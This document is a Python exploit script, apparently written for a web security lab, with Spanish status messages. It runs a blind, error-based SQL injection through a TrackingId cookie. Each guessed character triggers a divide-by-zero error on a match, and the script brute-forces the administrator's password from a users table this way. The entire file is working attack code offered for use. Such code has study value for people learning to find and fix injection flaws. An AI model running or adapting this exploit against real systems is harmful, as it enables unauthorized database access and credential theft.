#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
  print("\n\n[!] Saliendo..\n")
  sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#SQL attach based on cookie SQL injection code (default columns are useranme and password and users table is considered in this script)
main_url="URL"
characters= string.ascii_lowercase + string.digits

def makeRequest():
	password = ""
	p1 = log.progress("Fuerza Bruta")
	p1.status("iniciando ataque de fuerza bruta")
	time.sleep(2)
	p2 = log.progress("Password")
	for position in range (1,21):
		for character in characters:
			cookies = {
				'TrackingId':"QihcNFvmRQeecjwP'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position,character),
 				'session':'mYL95HtYdFvvDlShqA5m5F8ojdvzpzdI'
				}
			p1.status(cookies['TrackingId'])
			r = requests.get(main_url, cookies=cookies)
			#print(r.text)
			if "Internal Server Error" in r.text:
				password += character
				p2.status(password)
				break
if __name__ == '__main__':
	makeRequest()
